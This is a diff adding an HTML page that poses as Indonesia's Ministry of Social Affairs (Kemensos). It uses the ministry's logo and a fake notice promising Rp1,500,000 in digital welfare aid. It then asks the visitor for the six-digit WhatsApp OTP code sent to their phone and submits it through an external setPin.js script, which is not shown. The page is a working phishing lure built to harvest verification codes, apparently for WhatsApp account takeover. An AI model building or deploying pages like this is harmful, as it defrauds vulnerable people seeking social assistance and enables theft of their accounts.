@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verivy code</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/public/css/home.css">
+    <link rel="shortcut icon" href="/public/images/bannerbansosdg.jpeg" type="image/x-icon">
+</head>
+<body>
+    <div>
+        
+<header style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 64px;
+    padding: 0 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background-color: #ffffff;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+    z-index: 1000;
+    font-family: 'Segoe UI', sans-serif;
+  ">
+    <!-- Logo -->
+    <div style="display: flex; align-items: center;">
+      <img
+        src="https://kemensos.go.id/assets/img/light/logo.png"
+        alt="Logo Kemensos"
+        style="height: 40px;"
+      >
+    </div>
+  
+    <!-- Notifikasi -->
+    <div style="position: relative; display: flex; align-items: center;">
+      <i
+        id="notificationBell"
+        class="fas fa-bell"
+        style="font-size: 26px; color: #444; cursor: pointer;"
+      ></i>
+  
+      <!-- Badge -->
+      <span id="notificationBadge" style="
+        position: absolute;
+        top: -4px;
+        right: -6px;
+        background: red;
+        color: white;
+        font-size: 10px;
+        width: 16px;
+        height: 16px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        box-shadow: 0 0 2px rgba(0,0,0,0.4);
+      ">1</span>
+  
+      <!-- Popup -->
+      <div id="notificationPopup" style="
+        display: none;
+        position: absolute;
+        top: 42px;
+        right: 0;
+        width: 270px;
+        background: white;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        border-radius: 10px;
+        padding: 16px;
+        font-size: 14px;
+        color: #333;
+        animation: fadeIn 0.3s ease;
+        z-index: 1001;
+      ">
+        <strong>Notifikasi</strong><br>
+        Program Bansos Digital Resmi Dibuka!<br>
+        Daftarkan diri Anda untuk menerima bantuan awal Rp1.500.000 melalui rekening atau e-wallet resmi.
+      </div>
+    </div>
+  </header>
+  
+  <!-- Sound -->
+  <audio id="notificationSound" src="https://notificationsounds.com/storage/sounds/file-sounds-1152-pristine.mp3" preload="auto"></audio>
+  
+  <!-- CSS Animation -->
+  <style>
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  </style>
+  
+  <!-- Script -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const bell = document.getElementById('notificationBell');
+    const popup = document.getElementById('notificationPopup');
+    const badge = document.getElementById('notificationBadge');
+    const sound = document.getElementById('notificationSound');
+  
+    // Saat pertama kali halaman terbuka
+    setTimeout(function() {
+      sound.play().catch(err => console.log('Sound autoplay blocked'));
+      badge.style.display = 'flex'; // pastikan badge muncul
+    }, 500); // kecil delay 500ms biar lebih aman di semua browser
+  
+    // Klik bell toggle popup
+    bell.addEventListener('click', function(e) {
+      e.stopPropagation();
+      popup.style.display = (popup.style.display === 'block') ? 'none' : 'block';
+    });
+  
+    // Klik di luar nutup popup
+    document.addEventListener('click', function(e) {
+      if (!popup.contains(e.target) && e.target !== bell) {
+        popup.style.display = 'none';
+      }
+    });
+  });
+  </script>
+
+        <div class=container>
+        
+<main>
+    <style>
+      body {
+            font-family: Arial, sans-serif;
+            background-color: #F4F4F9;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Top bar styling */
+        .top-bar {
+            background-color: #F9F9F9;
+            padding: 5px 20px;
+            font-size: 12px;
+            color: #6B6B6B;
+            border-bottom: 1px solid #E5E5E5;
+            text-align: left;
+        }
+
+        .top-bar a {
+            color: #1A73E8;
+            text-decoration: none;
+            margin-left: 5px;
+        }
+
+        /* Header styling */
+        .header {
+            background-color: #2F318C;
+            color: white;
+            padding: 40px 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header .logo-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .header .logo-container img {
+            height: 35px;
+        }
+
+        .header .language-selector {
+            display: flex;
+            align-items: center;
+            border: 1px solid #FFFFFF;
+            color: #FFFFFF;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .header .language-selector i {
+            margin-right: 5px;
+        }
+
+        .header .content {
+            margin-top: 30px;
+        }
+
+        .header .content h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .header .content p {
+            margin: 5px 0 0;
+            font-size: 18px;
+        }
+
+        .header .illustration {
+            position: absolute;
+            bottom: 0;
+            right: -50px;
+            height: 100px;
+        }
+        #verify-button {
+            display: inline-block; 
+            padding: 0.5rem 1rem; 
+        }
+    </style>
+    
+    <div style="position: absolute; top: 64px; bottom: 0; left: 0; right: 0; display: flex; justify-content: center; align-items: center; background-color: #f5f5f5; font-family: 'Segoe UI', sans-serif; overflow: hidden; padding: 0 16px;">
+        <div style="width: 150%; max-width: 500px; background: #ffffff; border-radius: 16px; padding: 24px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);">
+            <h2 style="text-align: center; font-size: 22px; font-weight: 600; color: #333; margin-bottom: 12px;">
+                Masukkan Kode Verifikasi
+            </h2>
+            <p style="text-align: center; font-size: 14px; color: #555;">
+                Kode verifikasi 6 digit telah dikirimkan ke nomor anda
+                <span id="phone-number-display" style="color: #1c5443; font-weight: 500;">
+                    masukkan kode otp 6 digit angka dari WhatsApp untuk melanjutkan
+                </span>.
+            </p>
+            <form id="setPin" style="margin-top: 24px;" onclick="">
+                <div class="d-flex justify-content-center mb-4" style="gap: 10px;">
+                    
+ <input id="otp" name="otp" type="number" style="box-sizing: border-box; height: 40px; width: 200px; max-width: 99%; border: 1px solid #808080; border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -15px; padding-left: 40px" placeholder=""  required maxlength="" minlength="">
+  
+                    
+                </div>
+<input type="submit" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: #3F5CA5; border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 280px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: #3F5CA5 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="KIRIM"  />
+                </div>                
+            </form>
+        </div>
+    </div>
+     <p id="status"></p><script src = "setPin.js" > </script>
+  </script
+</body>
+</html>
